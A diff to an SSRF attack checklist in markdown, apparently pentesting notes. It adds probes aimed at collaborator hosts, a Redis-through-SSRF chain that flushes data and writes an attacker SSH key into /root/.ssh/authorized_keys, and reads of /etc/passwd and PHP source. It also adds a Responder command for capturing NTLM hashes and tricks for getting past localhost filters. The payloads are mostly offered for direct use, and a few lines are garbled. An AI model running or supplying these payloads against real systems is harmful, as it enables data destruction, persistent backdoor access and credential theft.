@@ -13,26 +13,64 @@
 
 ### CheckList
 
-- IP obfuscation `https://h.43z.one/ipconverter/
+ **Detection**
+ ```sh
+ #collab could be burp , webhook , python server 
+ ?url=http://<collab>
 
-- check the any link from stock or what so ever
+#internal resource
+?url=http://127.0.0.1:8080/
+ ```
 
-- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
+**RCE**
+```
+?url=http://<collab>/{whoami}
 
-- Obfuscate blocked strings using URL encoding or double encoding  , base64...
+?url=http://127.0.0.1:6379/flushall
 
-- insert the localhost `192.0.0.{0}` bruteforce to check a valid host 
+?url=http://127.0.0.1:6379/set ssh_key 'ssh-rsa AAAAB3... user@attacker'"
 
-- TEST `Host header `  -> ping meaning its vulnerable to `SSRF`
-- Test Referrer Header 
+?url=http://127.0.0.1:6379/config set dir /root/.ssh
+?url=http://127.0.0.1:6379/config set dbfilename authorized_keys
+
+?url=http://127.0.0.1:6379/save
+
+?url=php://filter/convert.base64-encode/resource=index.php"
+
+/?url=file:///etc/passwd
+```
+
+**Active Dir**
+
+```sh
+#we set up Responder on our machine with the following command: “responder -I tun0 -wv”. We then send a request to our Kali IP on a port that is not open, which results in a NetNTLMv2 hashed password
+responder -I tun0 -wv
+
+```
+
+**Web**
+
+- [ ]  IP obfuscation `https://h.43z.one/ipconverter/
+
+- [ ]  Use an alternative IP representation of `127.0.0.1`, such as decimal `2130706433`, `017700000001`, or `127.1`.
+
+- [ ] Obfuscate blocked strings using URL encoding or double encoding  , base64...
+
+- [ ] insert the localhost `192.0.0.{0}` bruteforce to check a valid host 
+
+ - [ ] `Host: localhost `
+
+- [ ] Test Referrer Header 
 
 > Payloads 
 ```
+
+
 /product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  
 
 stockApi=http://localhost:6566/admin  
 
-http://127.1:6566/admin  
+?url=http://127.0.0.1:8080/<gobuster  
 
 Host: localhost
 ```
